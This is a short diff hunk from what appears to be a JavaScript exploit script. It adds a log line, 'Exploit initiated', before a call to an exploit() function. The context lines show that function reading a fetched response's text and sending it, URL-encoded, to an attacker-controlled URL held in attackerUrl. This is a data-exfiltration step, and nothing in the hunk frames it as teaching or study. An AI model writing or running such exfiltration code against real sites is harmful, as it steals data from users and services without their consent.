@@ -4,5 +4,5 @@ async function exploit() {
 	const text = await res.text();
 	fetch(`${attackerUrl}?q=${encodeURIComponent(text)}`);
 }
-
+console.log('Exploit initiated');
 exploit()
